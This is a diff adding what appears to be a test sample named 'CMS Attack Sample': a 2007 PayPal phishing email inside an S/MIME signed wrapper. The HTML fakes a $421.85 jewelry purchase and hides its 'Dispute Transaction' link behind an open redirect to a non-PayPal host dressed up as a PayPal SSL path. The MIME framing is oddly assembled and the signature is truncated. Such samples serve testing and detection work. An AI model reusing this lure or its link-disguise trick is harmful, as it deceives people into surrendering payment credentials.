@@ -1,0 +1,128 @@
+From: blstuar@ppco.com
+To: mwailes@equilon.com
+Subject: CMS Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg="sha-256"; boundary="----490C85077250ED497BB5073404AA8786"
+This is an S/MIME signed message
+------490C85077250ED497BB5073404AA8786
+0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <WIN2K3MOsvGhcISPim9000017f1@WIN2K3.williams.veltri>
+X-OriginalArrivalTime: 19 Dec 2007 01:34:05.0515 (UTC) FILETIME=[3E1539B0:01C841DF]
+To: undisclosed-recipients:;
+Content-Length: 5058
+Lines: 92
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 480
+
+
+<HTML>
+<style type="text/css">
+<!--
+.style8 {font-family: Arial, Helvetica, sans-serif}
+.style15 {font-size: 11px}
+.style16 {color: #003399; font-size: 18px;}
+.style17 {color: #003399; font-size: 18px; font-family: Arial, Helvetica, sans-serif; }
+.style21 {
+	font-size: 12px;
+	color: #999999;
+}
+.style22 {color: #999999}
+-->
+</style>
+</HEAD>
+<BODY>
+<DIV>
+  <DIV id=xptHeader>
+<table width=30% height="154%" border=0 align=center cellpadding=0 cellspacing=0>
+      <tbody>
+        <tr> 
+          <td width="100%" height="0%"><img height=1 alt="" 
+      src="PayPal - Limited Account Access Details_files/pixel.gif" width=600 
+      border=0></td>
+        </tr>
+        <tr> 
+          <td height="9%"> <div id=xptTitle><img 
+      src="http://images.paypal.com/en_US/i/logo/email_logo.gif" alt="" width="255" height="35" 
+      border=0> </div></td>
+        </tr>
+          <td height="91%" valign=top nowrap><pre align="center"><font size="2" face="Arial, Helvetica, sans-serif">                        
+                         Dear Paypal user ,</font></pre>
+            <div align="center">
+              <div align="left">
+                
+              <pre><span class="style8"><font size="2">                         This email confirms that you have paid to <strong>diamondland
+</strong></font>                         (seller@diamondland.com) $421.85 USD using PayPal.         
+
+                         This credit card transaction will appear on your bill as
+                         &quot;PAYPAL DIAMONDS&quot; .</span></pre>
+              </div>
+            </div>
+            <hr align="center" width="400" class=dotted> 
+            <div align="center">
+              <div align="left">
+                <pre><span class="style8"><font size="2"><span class="style16">                     PayPal Shopping Cart Contents</span></font></span><strong><span class="style8"><font size="2">  
+                     
+                                   </font><span class="style15">Item Name</span></span></strong><span class="style8"><span class="style15"><strong>:</strong></span><font size="2"> 18k White Gold Bridal Set <strong>
+                                      </strong></font><strong><span class="style15"> Quantity</span></strong><span class="style15"><strong>:</strong></span><font size="2"> 1<strong>
+                                           </strong></font><strong><span class="style15">Total</span></strong><span class="style15"><strong>:</strong><font size="2"> </font></span>$421.85 USD</span>
+
+<span class="style8"><span class="style15"><strong>                                           Cart Subtotal: </strong></span>$421.85 USD</span>
+                  <span class="style8"><span class="style15"><strong> Sales Tax:</strong></span> $15.00 USD<strong>
+                                     <span class="style15">Cart Total: </span></strong>$436.85 USD</span>
+</pre>
+                <hr align="center" width="400" class=dotted>
+                
+              <pre><font size="2">            <span class="style17"> Shipping Information</span></font>  
+
+     <strong><span class="style8"><span class="style15">                         Shipping Info</span></span></strong><span class="style8"><span class="style15"><strong>:</strong></span></span> <span class="style8">Nancy L Heck
+                                                 90 Monrovia st.
+                                                 Beverly Hills, CA 90015
+                                                 United States
+                          <strong><span class="style15">Address Status</span></strong><span class="style15"><strong>:</strong></span></span> <span class="style8">Unconfirmed </span><img src="https://www.paypalobjects.com/en_US/i/scr/scr_symQuestion.gif" width="15" height="15">
+</pre>
+                <hr align="center" width="400" class=dotted>
+                <pre class="style8"><strong>                         If you haven't authorized this charge, click the link below
+                         to cancel the payment and get a full refund.
+
+                                                   <a href="http://www.aol.com/redir.adp?_e_t=ap&_a_v=2.0&_a_i=100124311x1116601028x1077500809&_url=http://ceujap.ujap.edu.ve/imagenes/.www.paypal.com/ssl/">Dispute Transaction</a></strong></pre>
+                <hr align="center" width="400" class=dotted>
+                <pre class="style8">                         Thank You for using PayPal!
+                         The PayPal Team
+
+<span class="style21">
+                                  Please do not reply to this e-mail. Mail sent to this address cannot 
+                                  be answered. For assistance, log in to your PayPal account and 
+                                  choose the &quot;Help&quot; link in the footer of any page.
+
+</span>
+<span class="style22">                         PayPal Email ID PP120</span></pre>
+              </div>
+            </div>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </DIV>
+  <DIV id=xptTabs><BR>
+  </DIV>
+</DIV></BODY></HTML>
+------490C85077250ED497BB5073404AA8786
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename="smime.p7s"
+MIIMbQYJKoZIhvcNAQcCoIIMXjCCDFoCAQExDzANBglghkgBZQMEAgEFADCB+AYJKoZIhvcNAQcB
+oIHqBIHnMYHkMBgGCSqGSIb3DQEJAzELBgkqhkiG9w0BBwEwHAYJKoZIhvcNAQkFMQ8XDTE5MDIx
+NTE1MzAyMlowLwYJKoZIhvcNAQkEMSIEIOG3Bbt9AHvSuJMMCac7lmViis5CNflnw1JfVmDP0bt/
+MHkGCSqGSIb3DQEJDzFsMGowCwYJYIZIAWUDBAEqMAsGCWCGSAFlAwQBFjALBglghkgBZQMEAQIw
+CgYIKoZIhvcNAwcwDgYIKoZIhvcNAwICAgCAMA0GCCqGSIb3DQMCAgFAMAcGBSsOAwIHMA0GCCqG
+SIb3DQMCAgEooIIJqzCCBJcwggN/oAMCAQICDkgbagiiRIjTXJs9yUgNMA0GCSqGSIb3DQEBCwUA
+MEwxIDAeBgNVBAsTF0dsb2JhbFNpZ24gUm9vdCBDQSAtIFIzMRMwEQYDVQQKEwpHbG9iYWxTaWdu
+
+------490C85077250ED497BB5073404AA8786
